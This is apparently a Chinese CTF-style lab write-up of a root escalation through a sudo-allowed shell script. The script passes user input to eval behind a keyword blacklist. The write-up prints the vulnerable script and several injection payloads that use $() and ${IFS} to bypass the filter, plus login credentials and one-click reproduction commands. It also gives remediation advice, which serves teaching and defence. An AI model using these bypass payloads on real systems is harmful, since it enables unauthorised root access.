---
title: Nightfall — 渗透测试
url: https://mp.weixin.qq.com/s/kjr7oqsPS5U6f_-bSLvyuw
source: Doonsec's feed
date: 2026-10-16
fetch_date: 2026-10-17T06:26:30.295200
---

# Nightfall — 渗透测试

# Nightfall — 渗透测试

网安之家-CyberHomestead

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# Nightfall — 渗透测试 Writeup（逐字回显版）

> 所有回显均为靶机原始输出，**未脱敏、未改写**。脚本来自 `txt`–`n3.txt`，原始回显来自 `nlog1.txt`–`nlog3.txt`。

## —0. 元信息—

| 项 | 值 |
| --- | --- |
| 目标主机 | `198.` |
| SSH 端口 | `31582` |
| 系统 | Alpine Linux 3.20.10（容器 `osep-nightfall-55679c9dc4-7hpgg`），内核 `6.1.0-52-cloud-amd64` |
| 凭据 | `ops` / `Ops_N1ght!2026` |
| 立足点 | 普通用户 `ops`（uid=1000），标准非受限 bash |
| user flag | `flag{nightfall_filter_bypass_cmd_injection}` |
| root flag | `flag{nightfall_root_via_netcheck_rce}` |
| 核心漏洞 | `/opt/netcheck.sh` 中 `eval` 命令注入 + 黑名单过滤绕过（`$()` + `${IFS}`） |
| sudo 授权 | `(root) NOPASSWD: /opt/netcheck.sh` |

## —1. 侦察 —— 逐字回显（`nlog1.txt`）—

`uid=1000(ops) gid=1000(ops) groups=1000(ops)``HOME=/home/ops``SHELL=/bin/bash``PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin``Linux osep-nightfall-55679c9dc4-7hpgg 6.1.0-52-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.180-1 (2026-08-03) x86_64 GNU/Linux``NAME="Alpine Linux"``ID=alpine``VERSION_ID=3.20.10``PRETTY_NAME="Alpine Linux v3.20"``HOME_URL="https://alpinelinux.org/"`

### 1.1 目录与 user flag

`=== ls home ===``total 12``drwxr-xr-x 1 ops  ops  4096 Aug 29 19:16 .``drwxr-xr-x 1 root root 4096 Aug 29 19:16 ..``-rw-r--r-- 1 ops  ops    44 Aug 29 19:16 user.txt``=== user.txt ===``flag{nightfall_filter_bypass_cmd_injection}`

> 注：user.txt 为 `-rw-r--r-- ops ops`，**当前用户直接可读**，无需注入即取得。

### 1.2 sudo 授权（决定性）

`=== sudo -l ===``Matching Defaults entries for ops on osep-nightfall-55679c9dc4-7hpgg:``!requiretty``User ops may run the following commands on osep-nightfall-55679c9dc4-7hpgg:``(root) NOPASSWD: /opt/netcheck.sh`

### 1.3 可用工具

`=== which ===``/usr/bin/sudo``/usr/bin/nc`

> 无 `doas`/`curl`/`python3`，但有 `nc`。

## —2. 漏洞分析：`/opt/netcheck.sh`（逐字回显，`nlog2.txt`）—

bash

`#!/bin/bash``# Turnstile NetCheck v1.2 — network diagnostics (runs as root)``host="$1"``# "Hardening": reject obvious command-injection metacharacters + risky keywords.``` ifecho"$host" | grep -qiE '[;&|`<>]|\bcat\b|\bbash\b|\bsh\b|[[:space:]]|/bin|/etc/shadow'; then ```echo"[netcheck] Blocked: illegal characters in target."; exit 1``fi``# Resolve + report the target.``eval"echo [netcheck] Target resolved: $host"`

文件属性：

`-rwxr-xr-x 1 root root 413 Aug 29 19:16 /opt/netcheck.sh`

### 2.1 原理

• 第 4 行把用户输入 `$host`**直接拼进 `eval`**：`eval "echo [netcheck] Target resolved: $host"`。`eval` 会二次解析并**执行**注入的 `$(...)` / 反引号命令替换。

• 过滤正则 `'[;&|`<>]|\bcat\b|\bbash\b|\bsh\b|[[:space:]]|/bin|/etc/shadow'`屏蔽了：`; & | `< >`、空白、`cat/bash/sh` 关键字、`/bin`、`/etc/shadow`。**但漏掉了 `$` 与 `(``)`**。

• 绕过要点：

1. 用 **`$( )`** 命令替换（不属于被禁字符集），不触犯 `;`/`|`/`` ` ``。

2. 用 **`${IFS}`**（Internal Field Separator，空格）替代被禁的**空白**。

3. 关键字绕过：用 `dd` 读文件、`ls` 列目录，**不使用被禁的 `cat`**。

## —3. 利用 —— 逐字回显（`nlog3.txt`）—

### 3.1 验证注入执行身份

`=== test injection id ===``[netcheck] Target resolved: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)`

`sudo /opt/netcheck.sh '$(id)'` → **`uid=0(root)`**，确认以 root 执行任意命令。

### 3.2 读取 root flag（用 `dd` 绕过 `cat` 关键字）

`=== read root flag via dd ===``0+1 records in``0+1 records out``38 bytes copied, 0.000646954 s, 58.7 kB/s``[netcheck] Target resolved: flag{nightfall_root_via_netcheck_rce}`

命令：`sudo /opt/netcheck.sh '$(dd${IFS}if=/root/root.txt)'`

### 3.3 佐证：列 `/root`

`=== fallback: ls root ===``[netcheck] Target resolved: total 12 drwx------ 1 root root 4096 Aug 29 19:16 . drwxr-xr-x 1 root root 4096 Oct 15 10:22 .. -rw------- 1 root root 38 Aug 29 19:16 root.txt`

命令：`sudo /opt/netcheck.sh '$(ls${IFS}-la${IFS}/root)'`

## —4. 敏感信息清单—

| 项 | 值 | 来源 |
| --- | --- | --- |
| 凭据 | `ops` / `Ops_N1ght!2026` | 任务书给定 |
| user flag | `flag{nightfall_filter_bypass_cmd_injection}` | `/home/ops/user.txt` （直接可读） |
| root flag | `flag{nightfall_root_via_netcheck_rce}` | `/root/root.txt` （`dd` 读出） |
| 主机名 | `osep-nightfall-55679c9dc4-7hpgg` | `uname -a` |
| sudo 授权 | `(root) NOPASSWD: /opt/netcheck.sh` | `sudo -l` |
| 服务名/版本 | `Turnstile NetCheck v1.2` | `netcheck.sh` 注释 |

## —5. 攻击链总览—

`ops@31582 (已知口令)``▼ SSH 登录``cat ~/user.txt                          → flag{nightfall_filter_bypass_cmd_injection}``▼``sudo -l → (root) NOPASSWD: /opt/netcheck.sh``▼``cat /opt/netcheck.sh → eval 拼接 + 黑名单过滤``▼ 绕过: $() + ${IFS} + dd (避开 cat/空格)``sudo /opt/netcheck.sh '$(dd${IFS}if=/root/root.txt)'``▼``root → flag{nightfall_root_via_netcheck_rce}`

## —6. 复现命令（一键）—

bash

`ssh -tt -o StrictHostKeyChecking=no -p 31582 ops@198.74.54.54    # 口令 Ops_N1ght!2026``cat ~/user.txt                                                   # flag{nightfall_filter_bypass_cmd_injection}``sudo -l                                                          # NOPASSWD: /opt/netcheck.sh``cat /opt/netcheck.sh                                             # 查看过滤规则``sudo /opt/netcheck.sh '$(id)'# uid=0(root)``sudo /opt/netcheck.sh '$(dd${IFS}if=/root/root.txt)'# flag{nightfall_root_via_netcheck_rce}`

现成脚本：

bash

`cd /tmp/opencode/bastion``python3 run.py n1.txt nlog1_replay.txt   # 侦察 + user flag``python3 run.py n2.txt nlog2_replay.txt   # 读 netcheck.sh``python3 run.py n3.txt nlog3_replay.txt   # root flag`

## —7. 可能卡点 & 玄机—

1. **正则漏 `$` 和括号**：过滤集是 `[;&|`<>]`加空白加关键字，**没有**`$`、`(`、`)` —— 这是本机唯一真正的洞。

2. **空白被禁**：普通写法 `$(id)` 能过；但 `$(cat /root/root.txt)` 会因**空白**和 **`cat`** 双重被拦。必须 `${IFS}` 替空格、`dd` 替 `cat`。

3. **`/etc/shadow` 与 `/bin` 被点名**：直接读 shadow 或引用 `/bin` 会触发拦截，改用 `dd`/`ls` 且路径不带 `/bin`。

4. **`!requiretty`**：允许非交互 sudo。

5. **user flag 是白给的**：user.txt 权限 `-rw-r--r--`，登录后即得，不要纠结「是否需要先注入才能拿 user」——本题 user 与 root 是两条独立证据。

## —8. 修复建议—

• **根本修复**：删除 `eval`，改为 `printf`/`echo` 输出（`echo "[netcheck] Target resolved: $host"`），`$host` 不必求值。

• 若必须求值：把 `$host` 严格校验为合法主机名（`^[A-Za-z0-9.-]{1,253}$`），使用白名单字符集，**拒绝**`$`、反引号、括号、空白。

• 不要把「grep 关键字黑名单」当安全边界（黑名单天然易漏）。

• 收紧 sudo：`/opt/netcheck.sh` 若只做诊断，不应以 root 运行。

• 禁止在特权脚本里对用户输入做 `eval`/间接执行。

## —9. MITRE ATT&CK 映射—

| 阶段 | 技术 | ID |
| --- | --- | --- |
| 初始访问 | Valid Accounts: Local Accounts | T1078.003 |
| 执行 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| 提权 | Abuse Elevation Control: Sudo（GTFOBins 类白名单脚本） | T1548.003 |
| 防御规避 | Obfuscated Files or Information（`${IFS}`/字符绕过） | T1027 |
| 凭据访问 | File and Directory Discovery | T1083 |

## —10. 下一步建议—

• 已 root，结束。建议把「特权脚本中 `eval` 用户输入」写成静态审计规则（grep `eval ".*\$`）在全环境扫描。

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/RmVdn3aKDuf5wkAH0ibQUO3iaiaRkLPDaZ31RRtics7Vic5DGssJSBXpAG6wS0gF9yD0lbp6edicBkemKEHWHHncrjGg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过